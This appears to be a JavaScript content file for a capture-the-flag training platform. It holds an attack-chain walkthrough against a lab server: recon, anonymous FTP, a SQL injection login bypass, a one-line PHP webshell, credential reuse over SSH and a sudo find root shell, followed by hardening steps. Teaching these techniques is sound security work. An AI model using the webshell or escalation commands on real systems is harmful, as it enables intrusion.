const refs = {
  arpScan: { title: 'arp-scan(1) - The ARP Scanner Manual', url: 'https://linux.die.net/man/1/arp-scan' },
  nmap: { title: 'Nmap Network Scanning - Official Reference', url: 'https://nmap.org/book/man.html' },
  vsftpd: { title: 'vsftpd.conf(5) Configuration Reference', url: 'https://man.cx/vsftpd.conf(5)' },
  owaspSqli: { title: 'OWASP SQL Injection Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
  owaspUpload: { title: 'OWASP File Upload Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html' },
  ssh: { title: 'OpenSSH Client Manual (ssh)', url: 'https://man.openbsd.org/ssh.1' },
  gtfobinsFind: { title: 'GTFOBins: find Sudo Functionality', url: 'https://gtfobins.github.io/gtfobins/find/#sudo' },
  sudoers: { title: 'Official sudoers(5) Manual', url: 'https://www.sudo.ws/docs/man/1.9.14/sudoers.man.pdf' },
  mitreSudo: { title: 'MITRE ATT&CK T1548.003 - Sudo and Sudo Caching', url: 'https://attack.mitre.org/techniques/T1548/003/' },
  mitreSecrets: { title: 'MITRE ATT&CK T1552.001 - Credentials In Files', url: 'https://attack.mitre.org/techniques/T1552/001/' },
};

export const learnTracks = [
  { id: 'recon', number: '01', title: 'Reconnaissance & Discovery', description: 'Local network host identification via ARP and complete port/service enumeration using Nmap.' },
  { id: 'web-exploitation', number: '02', title: 'Web Exploitation & Initial Access', description: 'Anonymous FTP intelligence gathering, SQL injection auth bypass, and PHP webshell execution.' },
  { id: 'lateral-privesc', number: '03', title: 'Lateral Movement & Privilege Escalation', description: 'Harvesting leaked credentials, pivoting via SSH for the user flag, and escaping via sudo find to root.' },
  { id: 'remediation', number: '04', title: 'Hardening & Defensive Remediation', description: 'Fixing anonymous FTP access, applying PDO prepared statements, and enforcing least-privilege sudoers.' },
];

export const learnModules = [
  // -------------------------------------------------------------------------
  // Module 1: Network Discovery
  // -------------------------------------------------------------------------
  {
    id: 'network-discovery',
    track: 'recon',
    title: 'Local Network Discovery & Host Identification',
    minutes: 10,
    objective: 'Locate the target virtual machine on the local network using link-layer ARP scanning.',
    intro: 'In lab environments, target machines typically receive a dynamic IP via DHCP. Before any enumeration can begin, you need to figure out which IP belongs to the target - not your gateway, not your own machine. ARP is the most reliable tool for this on a local segment.',
    outcomes: [
      'Understand why ARP works even when ICMP ping is blocked.',
      'Use arp-scan to enumerate active hosts on the local interface.',
      'Distinguish the target VM from gateways and hypervisors using MAC OUI.',
    ],
    diagram: {
      src: '/learn/enumeration-funnel.svg',
      alt: 'Reconnaissance funnel from broad host discovery to specific target profiling.',
      caption: 'Isolate the single target host before executing port and version scans.',
    },
    sections: [
      {
        id: 'arp-theory',
        title: 'Why ARP works on local networks',
        paragraphs: [
          'ARP operates at Layer 2, below the IP stack. Unlike ICMP ping, it cannot be filtered by standard host-based firewalls - a machine that blocks all ping requests still must answer ARP queries to function on the network.',
          'Virtual machines expose their virtualization platform through the MAC vendor prefix (OUI). This is often your clearest signal for identifying which responding host is the target versus infrastructure.',
        ],
        bullets: [
          'ARP replies are mandatory - hosts cannot silently ignore them.',
          'MAC vendor prefix (OUI) reveals the adapter type, helping distinguish VMs from physical machines.',
          'More reliable than ping on networks with ICMP restrictions.',
        ],
      },
      {
        id: 'running-arp',
        title: 'Running a local subnet scan',
        paragraphs: [
          'Scan your network interface and look for hosts you do not recognize. Pay attention to the vendor column - virtualization platforms have distinctive OUI prefixes.',
        ],
        commands: [
          {
            label: 'ARP scan of local subnet',
            value: 'sudo arp-scan --localnet',
            explanation: 'Sends ARP queries to every valid address on the local interface and reports responding hosts with their MAC vendor.',
            lookFor: 'An unfamiliar IP whose MAC vendor matches a virtualization platform.',
          },
          {
            label: 'Verify reachability',
            value: 'ping -c 3 <TARGET_IP>',
            explanation: 'Confirm basic connectivity to the candidate IP once identified.',
            lookFor: 'Low round-trip time and 0% packet loss.',
          },
        ],
        callout: {
          kind: 'info',
          title: 'Save the target IP',
          text: 'Store the confirmed address in a shell variable (`export TARGET=<TARGET_IP>`) so all subsequent commands stay consistent throughout your session.',
        },
      },
    ],
    mistakes: [
      'Scanning a broad range when only the local subnet matters.',
      'Treating an ICMP non-response as "host offline" - ARP may still reply.',
      'Mistaking the default gateway for the target machine.',
    ],
    checkpoint: {
      prompt: 'Confirm target identification before moving forward.',
      tasks: [
        'Run arp-scan and list every responding host with its MAC vendor.',
        'Identify the target based on vendor information and context.',
        'Confirm basic network reachability before proceeding to port scanning.',
      ],
    },
    references: [refs.arpScan],
  },

  // -------------------------------------------------------------------------
  // Module 2: Port & Service Enumeration
  // -------------------------------------------------------------------------
  {
    id: 'port-enumeration',
    track: 'recon',
    title: 'Port Enumeration & Service Profiling',
    minutes: 12,
    objective: 'Discover all listening services on the target and profile their versions to identify potential attack vectors.',
    intro: 'Scanning only the default top-1000 ports is a common mistake. Non-standard services, internal management panels, and custom listeners often sit outside that range. A full sweep followed by version detection gives you the complete picture.',
    outcomes: [
      'Perform a full TCP port sweep with Nmap.',
      'Extract service banners and version strings.',
      'Triage open services by attack priority.',
    ],
    sections: [
      {
        id: 'nmap-scan',
        title: 'Full-range port scan and version detection',
        paragraphs: [
          'Run Nmap against all 65,535 TCP ports and follow up with version probing on anything that is open.',
        ],
        commands: [
          {
            label: 'Full port and version scan',
            value: 'nmap -sV -p- <TARGET_IP>',
            explanation: '`-p-` covers all ports; `-sV` probes open ports to extract service and version information.',
            lookFor: 'Every open port and its associated service - note them all, even if they look uninteresting at first.',
          },
          {
            label: 'Targeted NSE script scan',
            value: 'nmap -sC -sV -p <PORT_LIST> <TARGET_IP>',
            explanation: 'Run default NSE scripts against specific ports for additional context like authentication policies and server headers.',
            lookFor: 'Misconfiguration hints, version-specific vulnerabilities, or services with anonymous access.',
          },
        ],
      },
      {
        id: 'vector-triage',
        title: 'Attack surface triage',
        paragraphs: [
          'Not all open ports deserve equal attention at first. Prioritize based on the attack surface each service typically presents:',
        ],
        bullets: [
          'FTP (port 21): Often misconfigured to allow unauthenticated access - high priority for initial recon.',
          'HTTP/HTTPS (port 80/443): Web applications are rich sources of injection and upload vulnerabilities.',
          'SSH (port 22): Requires authentication - lower initial priority, but becomes valuable once credentials surface elsewhere.',
        ],
        callout: {
          kind: 'info',
          title: 'Methodology',
          text: 'Resist jumping straight to brute force. Gather intelligence from application-layer services first - credentials almost always leak through misconfigurations, not brute force.',
        },
      },
    ],
    mistakes: [
      'Stopping at top-1000 ports and missing non-standard services.',
      'Brute-forcing SSH before exhausting FTP and web enumeration.',
      'Not recording version strings - they matter for vulnerability research.',
    ],
    checkpoint: {
      prompt: 'Document the complete service inventory.',
      tasks: [
        'List every open port with its service name and version string.',
        'Mark which services may allow unauthenticated access.',
        'Rank services by attack priority before proceeding.',
      ],
    },
    references: [refs.nmap],
  },

  // -------------------------------------------------------------------------
  // Module 3: FTP Anonymous Access
  // -------------------------------------------------------------------------
  {
    id: 'ftp-recon',
    track: 'web-exploitation',
    title: 'FTP Anonymous Access & Information Leakage',
    minutes: 12,
    objective: 'Assess whether the FTP service allows unauthenticated access and identify any files that disclose internal information.',
    intro: 'FTP servers configured to allow anonymous login expose whatever files sit in the public directory. Developers sometimes leave backup files, internal notes, or source code there without realizing the access policy is open to anyone on the network.',
    outcomes: [
      'Test anonymous login against an FTP service.',
      'Enumerate available files including hidden dotfiles.',
      'Analyze downloaded files for intelligence about other services on the system.',
    ],
    sections: [
      {
        id: 'anonymous-login',
        title: 'Testing anonymous authentication',
        paragraphs: [
          'The FTP protocol supports a special `anonymous` account. When prompted for a password, convention is to leave it empty or enter any email-like string. A successful login drops you into the public directory.',
        ],
        commands: [
          {
            label: 'Connect to FTP',
            value: 'ftp <TARGET_IP>',
            explanation: 'Opens an interactive FTP session. At the name prompt, try `anonymous`.',
            lookFor: '`230 Login successful` in the server response.',
          },
          {
            label: 'Enumerate and download files',
            value: 'ls -la\nget <filename>\nbye',
            explanation: 'List all entries including hidden files, then download anything that looks useful.',
            lookFor: 'Text files, backup archives, source files, or anything with an unusual extension.',
          },
        ],
      },
      {
        id: 'review-notes',
        title: 'Extracting intelligence from downloaded files',
        paragraphs: [
          'Read everything you can download. Developer notes, internal memos, and backup files often contain pointers to other services, authentication mechanisms, or known unfixed issues.',
        ],
        commands: [
          {
            label: 'Inspect a downloaded file',
            value: 'cat <filename>',
            explanation: 'Read the file contents carefully for any actionable intelligence.',
            lookFor: 'References to internal endpoints, source code patterns, usernames, or security warnings left by developers.',
          },
        ],
        callout: {
          kind: 'info',
          title: 'Think laterally',
          text: 'A developer note mentioning a vulnerability or a hidden endpoint is not just background noise - it is a direct pointer to your next step.',
        },
      },
    ],
    mistakes: [
      'Skipping anonymous login just because a password prompt appeared.',
      'Running only `ls` instead of `ls -la`, missing hidden dotfiles.',
      'Downloading files without reading them carefully.',
    ],
    checkpoint: {
      prompt: 'Summarize what the FTP server disclosed.',
      tasks: [
        'Confirm whether anonymous access is permitted.',
        'Enumerate and download all accessible files.',
        'Identify any intelligence relevant to other services on the target.',
      ],
    },
    references: [refs.vsftpd],
  },

  // -------------------------------------------------------------------------
  // Module 4: SQL Injection Auth Bypass
  // -------------------------------------------------------------------------
  {
    id: 'sqli-auth-bypass',
    track: 'web-exploitation',
    title: 'SQL Injection Authentication Bypass',
    minutes: 15,
    objective: 'Understand how dynamic SQL concatenation creates authentication bypass vulnerabilities and how to identify them.',
    intro: 'When a web application builds SQL queries by directly embedding user input into a string, an attacker can inject SQL syntax to change the query logic. The classic target is a login form - but the same flaw appears anywhere unsanitized input reaches a database query.',
    outcomes: [
      'Recognize insecure SQL string concatenation patterns in source code.',
      'Understand how comment sequences and boolean conditions can break query logic.',
      'Test a login form for SQL injection vulnerability.',
    ],
    sections: [
      {
        id: 'vulnerable-code-pattern',
        title: 'What makes a query injectable',
        paragraphs: [
          'A vulnerable authentication handler builds its query like this:',
          '`$sql = "SELECT * FROM users WHERE username = \'" . $user . "\' AND password = \'" . $pass . "\'";`',
          'User input is placed directly inside SQL syntax with no escaping or parameterization. Supplying a single quote breaks out of the string literal - anything after it gets interpreted as SQL, not data.',
        ],
      },
      {
        id: 'crafting-payload',
        title: 'How payloads manipulate query structure',
        paragraphs: [
          'Several approaches can force a login query to return a valid session:',
        ],
        bullets: [
          'Closing the string and commenting out the remainder: the password check never executes.',
          'Injecting an `OR` condition that always evaluates to true: the query returns a row regardless of the actual password.',
          'SQL dialects differ in comment syntax - `--`, `-- -`, `#` - and choosing the wrong one silently breaks the payload.',
        ],
        commands: [
          {
            label: 'Test a login endpoint via curl',
            value: 'curl -i -X POST http://<TARGET_IP>/<login_path> \\\'\n  -d "username=<payload>" \\\'\n  -d "password="',
            explanation: 'Submits a crafted POST to the login endpoint. Watch for an HTTP redirect or session cookie in the response.',
            lookFor: 'An HTTP 302 redirect to an authenticated page, or a `Set-Cookie` header indicating a session was created.',
          },
        ],
        callout: {
          kind: 'info',
          title: 'Use source code as a guide',
          text: 'If you recovered a source file or backup, read how the login query is constructed. It will tell you exactly which characters to inject and which comment syntax the backend uses.',
        },
      },
    ],
    mistakes: [
      'Using `#` comments on a backend that expects `--`, or vice versa.',
      'Forgetting to URL-encode special characters in curl requests.',
      'Assuming client-side form validation prevents the attack.',
    ],
    checkpoint: {
      prompt: 'Assess the login form for SQL injection.',
      tasks: [
        'Locate the login endpoint on the web application.',
        'Analyze any available source code for SQL query construction.',
        'Craft a payload that alters the query logic and observe the server response.',
      ],
    },
    references: [refs.owaspSqli],
  },

  // -------------------------------------------------------------------------
  // Module 5: Webshell Upload & Execution
  // -------------------------------------------------------------------------
  {
    id: 'webshell-upload',
    track: 'web-exploitation',
    title: 'Arbitrary File Upload & Remote Code Execution',
    minutes: 15,
    objective: 'Understand how unrestricted file upload features can lead to remote code execution on a web server.',
    intro: 'File upload functionality is common in admin dashboards. When the server fails to validate file types and allows uploaded files to be executed by the web engine, any user with upload access can plant a script that runs arbitrary commands as the web server process.',
    outcomes: [
      'Construct a minimal PHP web shell.',
      'Identify upload endpoints that lack execution controls.',
      'Trigger command execution through an uploaded file and determine the execution context.',
    ],
    sections: [
      {
        id: 'crafting-shell',
        title: 'A minimal PHP web shell',
        paragraphs: [
          'A web shell does not need to be complex. The simplest form accepts a command via a request parameter and passes it to a PHP built-in function like `system()`, `passthru()`, or `shell_exec()`.',
        ],
        commands: [
          {
            label: 'Create a one-line shell locally',
            value: 'echo "<?php if(isset($_GET[\'cmd\'])){ system($_GET[\'cmd\']); } ?>" > shell.php',
            explanation: 'Creates a PHP file that executes whatever is passed in the `cmd` query parameter.',
            lookFor: 'A valid PHP file with no syntax errors.',
          },
        ],
      },
      {
        id: 'upload-trigger',
        title: 'Uploading and verifying execution',
        paragraphs: [
          'Find the upload form in the authenticated dashboard, then upload your shell. After uploading, determine where the file was stored - check the page source or response body. Then trigger the shell by requesting the file with a command parameter.',
        ],
        commands: [
          {
            label: 'Trigger a command via web shell',
            value: 'curl "http://<TARGET_IP>/<upload_path>/shell.php?cmd=id"',
            explanation: 'Sends a GET request with the `cmd` parameter to the uploaded shell.',
            lookFor: '`uid=` output - this reveals which user the web server process is running as.',
          },
        ],
        callout: {
          kind: 'info',
          title: 'Foothold established',
          text: 'Confirming command output means you have code execution on the server. Use this access to explore the filesystem - configuration files and system accounts are your next targets.',
        },
      },
    ],
    mistakes: [
      'Trying complex payloads before verifying basic command execution works.',
      'Not URL-encoding spaces and special characters in query strings.',
      'Guessing the upload path instead of reading the server response.',
    ],
    checkpoint: {
      prompt: 'Confirm remote code execution.',
      tasks: [
        'Upload a minimal PHP shell via the admin upload form.',
        'Locate the uploaded file URL from the server response.',
        'Execute `id` through the shell and note the process owner.',
      ],
    },
    references: [refs.owaspUpload],
  },

  // -------------------------------------------------------------------------
  // Module 6: Credential Harvesting & Lateral Movement
  // -------------------------------------------------------------------------
  {
    id: 'credential-harvesting',
    track: 'lateral-privesc',
    title: 'Credential Harvesting & Lateral Movement to SSH',
    minutes: 15,
    objective: 'Locate plaintext credentials in web application config files and test them against other services on the system.',
    intro: 'Web applications need database credentials to function, and those credentials live somewhere on disk. PHP config files under the web root are common hiding spots. The bigger problem is credential reuse - the same password found in a config file often works for SSH or other local accounts.',
    outcomes: [
      'Search the web root for configuration files containing hardcoded credentials.',
      'Cross-reference discovered usernames against system accounts.',
      'Test credential reuse against SSH.',
    ],
    sections: [
      {
        id: 'inspecting-configs',
        title: 'Finding hardcoded credentials',
        paragraphs: [
          'From your web shell, read configuration files in the web root. PHP apps commonly store connection parameters in files named `db_config.php`, `config.php`, `.env`, or similar. Look for variables holding usernames and passwords.',
        ],
        commands: [
          {
            label: 'Read a config file via webshell',
            value: 'curl "http://<TARGET_IP>/<shell_path>?cmd=cat+/var/www/html/<config_file>"',
            explanation: 'Use your web shell to read the contents of a configuration file on the server.',
            lookFor: 'Variables holding usernames and passwords, especially for database connections.',
          },
          {
            label: 'Enumerate system accounts',
            value: 'curl "http://<TARGET_IP>/<shell_path>?cmd=cat+/etc/passwd"',
            explanation: 'Read the system user list to find accounts with interactive login shells.',
            lookFor: 'Entries ending in `/bin/bash` or `/bin/sh` - those are accounts you can potentially SSH into.',
          },
        ],
      },
      {
        id: 'ssh-pivot',
        title: 'Pivoting to SSH',
        paragraphs: [
          'Compare the username in the config file against the system account list. If there is a match, try the password against SSH. Credential reuse between application accounts and system accounts is extremely common.',
        ],
        commands: [
          {
            label: 'SSH login attempt',
            value: 'ssh <username>@<TARGET_IP>',
            explanation: 'Attempt an interactive login using the credentials you discovered.',
            lookFor: 'A shell prompt - this confirms successful lateral movement to an interactive account.',
          },
          {
            label: 'Check the home directory',
            value: 'ls ~ && cat ~/user.txt',
            explanation: 'Look for the user flag file in the home directory.',
            lookFor: 'A file containing a value in `EH{...}` format.',
          },
        ],
        callout: {
          kind: 'info',
          title: 'Flag 1 (User Flag)',
          text: 'Submit the value found in `~/user.txt` to Challenge 1 ("User Flag") in the CTF portal. To finish the competition, proceed to Module 07 for the privilege escalation path to the root flag.',
        },
      },
    ],
    mistakes: [
      'Staying in the limited webshell when SSH gives a far more stable session.',
      'Only checking obvious config filenames - look for `.bak` files and hidden dotfiles too.',
      'Assuming credentials are unique to one service.',
    ],
    checkpoint: {
      prompt: 'Verify lateral movement to a system account.',
      tasks: [
        'Locate a configuration file containing hardcoded credentials.',
        'Identify a system account matching the discovered username.',
        'Attempt SSH login with the reused credentials and check the home directory for Flag 1.',
        'Proceed to Module 07 to escalate to root.',
      ],
    },
    references: [refs.ssh, refs.mitreSecrets],
  },

  // -------------------------------------------------------------------------
  // Module 7: Sudo Privilege Escalation to Root Flag
  // -------------------------------------------------------------------------
  {
    id: 'sudo-privesc-find',
    track: 'lateral-privesc',
    title: 'Privilege Escalation via Sudo Find (Root Flag & GTFOBins)',
    minutes: 15,
    objective: 'Audit sudo privileges on the compromised account, leverage GTFOBins binary execution to spawn a root shell, and capture the final root flag.',
    intro: 'After obtaining access as an unprivileged user, your final objective is complete system compromise (root). Linux sudo configurations often grant specific utility binaries NOPASSWD execution rights. Many of these utilities support command execution flags that can be abused to break out into a full root shell.',
    outcomes: [
      'Enumerate permitted sudo commands using `sudo -l`.',
      'Identify binaries with shell breakout capabilities using GTFOBins.',
      'Execute a privileged shell to obtain root access and retrieve Flag 2.',
    ],
    diagram: {
      src: '/learn/pe-workflow.svg',
      alt: 'Privilege escalation workflow: Sudo Audit -> GTFOBins Lookup -> Root Execution.',
      caption: 'Leverage permitted binary functionality to transition execution into the root context.',
    },
    sections: [
      {
        id: 'sudo-audit',
        title: 'Auditing Sudo Permissions',
        paragraphs: [
          'As soon as you obtain an interactive SSH shell as a standard user, check what commands you are permitted to run with elevated privileges.',
        ],
        commands: [
          {
            label: 'Enumerate sudo permissions',
            value: 'sudo -l',
            explanation: 'Displays the sudoers configuration entries permitted for the current user.',
            lookFor: 'Entries marked with `NOPASSWD:` - particularly utility binaries such as `/usr/bin/find`.',
          },
        ],
      },
      {
        id: 'gtfobins-find',
        title: 'Abusing Binary Execution via GTFOBins',
        paragraphs: [
          'GTFOBins catalogs how Unix binaries can be exploited to bypass local security restrictions. When a binary like `find` is allowed in sudoers without a password, its execution parameters (such as `-exec`) can be used to run commands directly as root.',
        ],
        commands: [
          {
            label: 'Spawn interactive root shell',
            value: 'sudo find . -exec /bin/sh \\; -quit',
            explanation: 'Executes `/bin/sh` through find with root privileges. The `-quit` argument exits find immediately after the shell terminates.',
            lookFor: 'The terminal prompt changes from `$` to `#`, signifying root execution context.',
          },
          {
            label: 'Verify root context',
            value: 'whoami && id',
            explanation: 'Confirms that the active process is operating with effective root user privileges.',
            lookFor: '`root` and `uid=0(root) gid=0(root)` in the output.',
          },
        ],
      },
      {
        id: 'root-flag-retrieval',
        title: 'Capturing the Root Flag',
        paragraphs: [
          'With root privileges established, navigate to the administrator home directory (`/root`) to retrieve the second and final competition flag.',
        ],
        commands: [
          {
            label: 'Read root flag',
            value: 'cat /root/root.txt',
            explanation: 'Displays the contents of the root flag file located in the `/root` directory.',
            lookFor: 'A string starting with `EH{` representing the root flag.',
          },
        ],
        callout: {
          kind: 'good',
          title: 'Flag 2 (Root Flag)',
          text: 'Submit the recovered value to Challenge 2 ("Root Flag") in the CTF portal to complete the challenge.',
        },
      },
    ],
    mistakes: [
      'Not running `sudo -l` immediately after landing on a new account.',
      'Overlooking binaries that seem harmless without checking GTFOBins.',
      'Failing to verify root identity before proceeding.',
    ],
    checkpoint: {
      prompt: 'Confirm full root compromise.',
      tasks: [
        'Run `sudo -l` to discover permitted binaries.',
        'Apply the GTFOBins execution technique to spawn a root shell.',
        'Confirm root identity with `whoami` and `id`.',
        'Read `/root/root.txt` and submit Flag 2 in the portal.',
      ],
    },
    references: [refs.gtfobinsFind, refs.sudoers, refs.mitreSudo],
  },

  // -------------------------------------------------------------------------
  // Module 8: Hardening & Defensive Remediation
  // -------------------------------------------------------------------------
  {
    id: 'remediation-hardening',
    track: 'remediation',
    title: 'Defensive Remediation & Infrastructure Hardening',
    minutes: 14,
    objective: 'Apply least-privilege principles, secure configurations, and defensive controls to fix every vulnerability in the attack chain.',
    intro: 'An attack path is only as useful as the defense it inspires. Understanding how the ExamCorp server was breached enables system administrators and developers to patch the root causes across all layers.',
    outcomes: [
      'Disable anonymous access in vsftpd configuration.',
      'Refactor dynamic SQL queries to use secure PDO prepared statements.',
      'Harden file upload endpoints against web shell execution.',
      'Apply least-privilege principles to sudoers configuration.',
    ],
    sections: [
      {
        id: 'ftp-fix',
        title: '1. Hardening FTP configuration',
        paragraphs: [
          'In `/etc/vsftpd.conf`, anonymous access should always be disabled unless strictly required by public distribution requirements.',
        ],
        commands: [
          {
            label: 'Disable anonymous FTP in vsftpd.conf',
            value: 'sudo sed -i \'s/anonymous_enable=YES/anonymous_enable=NO/g\' /etc/vsftpd.conf\nsudo systemctl restart vsftpd',
            explanation: 'Disables anonymous authentication and restarts the daemon.',
            lookFor: '`anonymous_enable=NO` in `/etc/vsftpd.conf`.',
          },
        ],
      },
      {
        id: 'sqli-fix',
        title: '2. Remediating SQL injection with Prepared Statements',
        paragraphs: [
          'Replace vulnerable string concatenation with parameterized SQL queries using PHP PDO:',
        ],
        commands: [
          {
            label: 'Secure PDO authentication pattern',
            value: '$stmt = $pdo->prepare("SELECT id, username, password FROM users WHERE username = :user");\n$stmt->execute([\'user\' => $username]);\n$user = $stmt->fetch();\nif ($user && password_verify($password, $user[\'password\'])) {\n    // Login successful\n}',
            explanation: 'Parameters are sent separately from query logic, preventing SQL injection completely.',
            lookFor: 'Use of `prepare()` and `password_verify()`.',
          },
        ],
      },
      {
        id: 'upload-fix',
        title: '3. Protecting file upload directories',
        paragraphs: [
          'Never permit script execution in directories where uploaded files are stored. In Apache, disable the PHP engine for `/uploads` in `.htaccess` or virtual host configuration:',
        ],
        commands: [
          {
            label: 'Disable PHP engine in uploads directory',
            value: '# /var/www/html/uploads/.htaccess\n<FilesMatch "\\.(php|phtml|php3|php4|php5|php7|phps)$">\n    SetHandler None\n    Require all denied\n</FilesMatch>\nphp_flag engine off',
            explanation: 'Prevents the web server from executing any PHP files uploaded by users.',
            lookFor: 'Direct download or 403 Forbidden instead of code execution.',
          },
        ],
      },
      {
        id: 'sudoers-fix',
        title: '4. Enforcing least privilege in sudoers',
        paragraphs: [
          'Never grant sudo permissions to binaries that provide shell escapes or interactive execution (like `find`, `vi`, `less`, `awk`, `nmap`).',
          'If a user only needs to search files, configure specific scripts or inspect whether root privilege is truly necessary.',
        ],
        commands: [
          {
            label: 'Safe sudoers rule',
            value: '# Remove dangerous binary permissions:\n# examuser ALL=(root) NOPASSWD: /usr/bin/find\n\n# Replace with a specific, hardened maintenance script:\nexamuser ALL=(root) NOPASSWD: /usr/local/bin/safe_backup.sh',
            explanation: 'Restrict sudo execution to tightly controlled, non-interactive scripts with absolute paths.',
            lookFor: 'Clean `sudo -l` output without generic GTFOBins binaries.',
          },
        ],
      },
    ],
    mistakes: [
      'Relying on client-side validation instead of backend controls.',
      'Blacklisting specific file extensions (.php) instead of whitelisting (.png, .jpg).',
      'Granting broad NOPASSWD sudo access for convenience.',
    ],
    checkpoint: {
      prompt: 'Conduct a post-remediation security audit.',
      tasks: [
        'Verify `anonymous` FTP login is rejected with `530 Permission denied`.',
        'Verify SQL injection bypass payloads return authentication errors.',
        'Verify uploaded `.php` files are denied or served as plaintext without executing.',
        'Verify `sudo -l` does not list `/usr/bin/find`.',
      ],
    },
    references: [refs.owaspSqli, refs.owaspUpload, refs.sudoers],
  },
];
